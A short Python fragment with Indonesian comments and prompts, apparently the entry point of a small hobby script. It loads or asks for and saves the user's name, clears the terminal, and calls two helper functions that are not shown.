def main(): #Inti Dari Sebuah Inti
  nama = get_nama()
  if nama is None:
    nama = input("Masukkan nama Anda: ")
    simpan_nama(nama)
    os.system("clear")
  caramel_freya()
  dino_zee()

main()